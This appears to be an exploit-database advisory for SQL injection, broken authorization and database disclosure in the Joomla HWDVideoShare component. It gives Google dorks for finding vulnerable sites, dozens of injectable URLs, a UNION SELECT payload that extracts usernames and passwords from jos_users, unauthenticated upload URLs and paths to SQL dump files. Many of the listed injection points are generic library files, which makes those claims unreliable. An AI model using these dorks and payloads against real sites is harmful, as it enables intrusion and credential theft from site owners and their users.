####################################################################

# Exploit Title : Joomla HWDVideoShare Components 1.5 SQL Injection / Database Disclosure / Incorrect Authorization
# Author [ Discovered By ] : KingSkrupellos
# Team : Cyberizm Digital Security Army
# Date : 30/01/2019
# Vendor Homepage : joomla.org ~ hwdmediashare.co.uk
# Software Download Link : hwdmediashare.co.uk/hwdvideoshare
# Software Source Files and Codes :
github.com/rkern21/videoeditor/tree/master/administrator/components/com_hwdvideoshare
# Software Version : 1.0 and 1.5
# Tested On : Windows and Linux
# Category : WebApps
# Exploit Risk : High
# Google Dorks : inurl:''/index.php?option=com_hwdvideoshare''
intext:Joomla Video Component by hwdVideoShare
intext:Designed & Developed by Quantum Pro 4 Information Technology
intext:desenvolvido por MANUEL PEDREIRO
intext:Icones por "Marcos Antonio"
intext:Powered by hwdMediaShare
# Vulnerability Type : CWE-89 [ Improper Neutralization of 
Special Elements used in an SQL Command ('SQL Injection') ]
CWE-200 [ Information Exposure ]
CWE-863 [ Incorrect Authorization ]
# Similar but Old CVE 02/22/2008 : cvedetails.com/cve/CVE-2008-0916/  -  CVE-2008-0916
Note : Keep in Mind. This Exploit/Vulnerability is in more details with another version.
# PacketStormSecurity : packetstormsecurity.com/files/authors/13968
# CXSecurity : cxsecurity.com/author/KingSkrupellos/1/
# Exploit4Arab : exploit4arab.org/author/351/KingSkrupellos
# Reference Link : cxsecurity.com/issue/WLB-2019010286

####################################################################

# Description about Software :
***************************

* hwdVideoShare was a powerful Joomla 1.5 video gallery that allowed Joomla webmasters to 

display video media in an organised and manageable layout on the internet. 

The gallery could handle the uploading, server-side processing and playback of large video 

media in all popular formats. It could also import videos from popular 

video websites such as Youtube and Vimeo.

####################################################################

# Impact :
***********

* SQL injection vulnerability in the HWDVideoShare (com_hwdvideoshare) 

1.5 component for Joomla! allows remote attackers to execute arbitrary 

SQL commands via the " cat_id Itemid= pattern= hwdcorder= video_id= " 

with different parameters action to index.php and it has SQL Database Errors

under the administrator components.

* An attacker might be able inject and/or alter existing SQL statements which would influence the database exchange.

* It fails to sufficiently sanitize user-supplied data before using it in an SQL query.

* Exploiting this issue could allow an attacker to compromise the application, read,

access or modify data, or exploit latent vulnerabilities in the underlying database. 

If the webserver is misconfigured, read & write access to the filesystem may be possible.

* This software hwdVideoShare performs an authorization check when an actor attempts to access

a resource or perform an action, but it does not correctly perform the check. 

This allows attackers to bypass intended access restrictions.

####################################################################

# SQL Injection Exploit :
**********************

/administrator/components/com_hwdvideoshare/libraries/warp/infin-lib.php?id=[SQL Injection]

/administrator/components/com_hwdvideoshare/libraries/warp/nusoap/class.nusoap_base.php?id=[SQL Injection]

/administrator/components/com_hwdvideoshare/libraries/warp/nusoap/class.soap_fault.php?id=[SQL Injection]

/administrator/components/com_hwdvideoshare/libraries/warp/nusoap/class.soap_parser.php?id=[SQL Injection]

/administrator/components/com_hwdvideoshare/libraries/warp/nusoap/class.soap_server.php?id=[SQL Injection]

/administrator/components/com_hwdvideoshare/libraries/warp/nusoap/class.soap_transport_http.php?id=[SQL Injection]

/administrator/components/com_hwdvideoshare/libraries/warp/nusoap/class.soap_val.php?id=[SQL Injection]

/administrator/components/com_hwdvideoshare/libraries/warp/nusoap/class.soapclient.php?id=[SQL Injection]

/administrator/components/com_hwdvideoshare/libraries/warp/nusoap/class.wsdl.php?id=[SQL Injection]

/administrator/components/com_hwdvideoshare/libraries/warp/nusoap/class.wsdlcache.php?id=[SQL Injection]

/administrator/components/com_hwdvideoshare/libraries/warp/nusoap/class.xmlschema.php?id=[SQL Injection]

/administrator/components/com_hwdvideoshare/libraries/warp/nusoap/nusoap.php?id=[SQL Injection]

/administrator/components/com_hwdvideoshare/libraries/GIFEncoder.class.php?id=[SQL Injection]

/administrator/components/com_hwdvideoshare/libraries/csv_iterator.class.php?id=[SQL Injection]

/administrator/components/com_hwdvideoshare/libraries/file_management.class.php?id=[SQL Injection]

/administrator/components/com_hwdvideoshare/libraries/maintenance_archivelogs.class.php?id=[SQL Injection]

/administrator/components/com_hwdvideoshare/libraries/maintenance_fixerrors.class.php?id=[SQL Injection]

/administrator/components/com_hwdvideoshare/libraries/maintenance_recount.class.php?id=[SQL Injection]

/administrator/components/com_hwdvideoshare/libraries/mysql_backup.class.php?id=[SQL Injection]

/administrator/components/com_hwdvideoshare/libraries/streamers.class.php?id=[SQL Injection]

/administrator/components/com_hwdvideoshare/libraries/thumbnail.inc.php?id=[SQL Injection]

/administrator/components/com_hwdvideoshare/libraries/id3/getid3.php?id=[SQL Injection]

/administrator/components/com_hwdvideoshare/libraries/id3/getid3.lib.php?id=[SQL Injection]

/administrator/components/com_hwdvideoshare/libraries/smarty/Config_File.class.php?id=[SQL Injection]

/administrator/components/com_hwdvideoshare/libraries/smarty/Smarty.class.php?id=[SQL Injection]

/administrator/components/com_hwdvideoshare/libraries/smarty/Smarty_Compiler.class.php?id=[SQL Injection]

/administrator/components/com_hwdvideoshare/libraries/thumbnail/thumbnail.inc.php?id=[SQL Injection]

/index.php?option=com_hwdvideoshare&Itemid=[SQL Injection]

/index.php?option=com_hwdvideoshare&task=frontpage&Itemid=[SQL Injection]

/index.php?option=com_hwdvideoshare&func=viewcategory&Itemid=[SQL Injection]

/index.php?option=com_hwdvideoshare&task=search&Itemid=[SQL Injection]

/index.php?option=com_hwdvideoshare&task=search&Itemid=[ID-NUMBER]&pattern=[SQL Injection]

/index.php?option=com_hwdvideoshare&task=categories&Itemid=[SQL Injection]

/index.php?option=com_hwdvideoshare&Itemid=[ID-NUMBER]&task=categories&hwdcorder=[SQL Injection]

/index.php?option=com_hwdvideoshare&task=viewvideo&Itemid=[ID-NUMBER]&video_id=[SQL Injection]

/index.php?option=com_hwdvideoshare&task=viewcategory&Itemid=[ID-NUMBER]&cat_id=[SQL Injection]

/index.php?option=com_hwdvideoshare&task=displayresults&Itemid=
[ID-NUMBER]&rpp=[ID-NUMBER]&sort=[ID-NUMBER]&ep=&ex=&category_id=
[ID-NUMBER]&pattern=[SQL Injection]

# Exploit Payload PoC :
*********************

/[ID-NUMBER]&cat_id=-9999999/**/union/**/select/**/000,111,222,username,password,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,2,2,2/**/from/**/jos_users/*

####################################################################

# Add Video File without Authorization / Incorrect Authorization Exploit :
**********************************************************************

/index.php?option=com_hwdvideoshare&Itemid=[ID-NUMBER]&task=upload

/index.php?option=com_hwdvideoshare&Itemid=[ID-NUMBER]&task=upload&lang=en

# Directory File Path :
*******************

/index.php?option=com_hwdvideoshare&Itemid=[ID-NUMBER]&task=categories

/index.php?option=com_hwdvideoshare&Itemid=[ID-NUMBER]&task=groups

/index.php?option=com_hwdvideoshare&Itemid=[ID-NUMBER]&task=frontpage

/index.php?option=com_hwdvideoshare&Itemid=[ID-NUMBER]&task=viewvideo&video_id=[ID-NUMBER]?tmpl=component

# Note : If websites are not vulnerable it says :

You are not authorized to upload videos.

####################################################################

# Database Disclosure Exploit :
***************************

/administrator/components/com_hwdvideoshare/install.mysql.nonutf8.sql

/administrator/components/com_hwdvideoshare/install.mysql.utf8.sql

####################################################################

# Discovered By KingSkrupellos from Cyberizm.Org Digital Security Team 

####################################################################
